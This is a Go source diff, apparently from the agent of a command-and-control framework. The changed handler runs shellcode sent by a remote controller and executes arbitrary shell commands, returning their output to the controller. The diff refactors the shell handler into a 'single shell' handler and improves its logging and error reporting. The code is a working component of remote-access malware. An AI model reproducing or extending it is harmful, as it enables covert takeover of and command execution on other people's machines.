@@ -100,8 +100,8 @@ func (h *handler) OnMessage(answer *protocol.Answer) {
 	switch msgType {
 	case messages.CMDExecuteShellCode:
 		h.handleExecuteShellCode(answer)
-	case messages.CMDShell:
-		h.handleShell(answer)
+	case messages.CMDSingleShell:
+		h.handleSingleShell(answer)
 	case messages.CMDTest:
 		h.handleSendTestMessage(answer)
 	case messages.CMDRTTestRequest:
@@ -123,39 +123,40 @@ func (h *handler) handleExecuteShellCode(answer *protocol.Answer) {
 		h.logWithInfo(logger.Exploit, answer, log)
 		return
 	}
+	// must copy, because not use h.wg
+	lg := h.ctx.logger
 	go func() {
-		// add interrupt to execute wg.Done
 		err = shellcode.Execute(es.Method, es.ShellCode)
 		if err != nil {
-			// send execute error
-			fmt.Println("--------------", err)
+			lg.Println(logger.Error, "failed to execute shellcode:", err)
 		}
 	}()
 }
 
-func (h *handler) handleShell(answer *protocol.Answer) {
-	defer h.logPanic("handler.handleShell")
-	s := new(messages.Shell)
-	err := msgpack.Unmarshal(answer.Message, s)
+func (h *handler) handleSingleShell(answer *protocol.Answer) {
+	const title = "handler.handleSingleShell"
+	defer h.logPanic(title)
+	ss := new(messages.SingleShell)
+	err := msgpack.Unmarshal(answer.Message, ss)
 	if err != nil {
-		const log = "controller send invalid shell"
+		const log = "controller send invalid single shell"
 		h.logWithInfo(logger.Exploit, answer, log)
 		return
 	}
+	h.wg.Add(1)
 	go func() {
-		// add interrupt to execute wg.Done
-		output, err := shell.Shell(s.Command)
+		defer func() {
+			h.logPanic(title)
+			h.wg.Done()
+		}()
+		sso := &messages.SingleShellOutput{ID: ss.ID}
+		sso.Output, err = shell.Shell(h.context, ss.Command)
 		if err != nil {
-			// send execute error
-			return
+			sso.Err = err.Error()
 		}
-
-		so := messages.ShellOutput{
-			Output: output,
-		}
-		err = h.ctx.sender.Send(h.context, messages.CMDBShellOutput, &so, true)
+		err = h.ctx.sender.Send(h.context, messages.CMDBSingleShellOutput, sso, true)
 		if err != nil {
-			fmt.Println("failed to send:", err)
+			h.log(logger.Error, "failed to send single shell output:", err)
 		}
 	}()
 }
